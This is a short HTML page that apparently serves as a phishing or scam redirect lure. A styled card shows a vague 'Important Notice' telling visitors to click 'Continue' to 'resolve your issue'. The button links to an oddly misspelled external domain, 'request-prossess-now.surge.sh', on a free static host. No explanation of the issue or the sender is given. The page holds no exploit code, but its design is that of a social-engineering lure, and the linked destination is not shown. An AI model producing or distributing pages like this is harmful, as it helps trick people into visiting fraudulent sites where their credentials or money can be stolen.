<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Notice</title>

<style>
body{
    margin:0;
    font-family:Arial,sans-serif;
    background:linear-gradient(135deg,#2563eb,#7c3aed);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.box{
    background:#fff;
    width:90%;
    max-width:420px;
    padding:35px;
    border-radius:18px;
    text-align:center;
    box-shadow:0 20px 50px rgba(0,0,0,0.25);
}

.icon{
    font-size:55px;
    margin-bottom:10px;
}

h2{
    color:#111;
    margin-bottom:10px;
}

p{
    color:#555;
    font-size:15px;
    line-height:1.6;
}

.btn{
    display:inline-block;
    margin-top:20px;
    padding:12px 28px;
    background:#2563eb;
    color:#fff;
    text-decoration:none;
    border-radius:25px;
    font-weight:bold;
}

.btn:hover{
    background:#1d4ed8;
}
</style>
</head>

<body>

<div class="box">
    <div class="icon"></div>

    <h2>Important Notice</h2>

    <p>If you want to resolve your issue, please click the button below to continue.</p>

    <a href="https://request-prossess-now.surge.sh" class="btn">Continue</a>
</div>

</body>
</html>
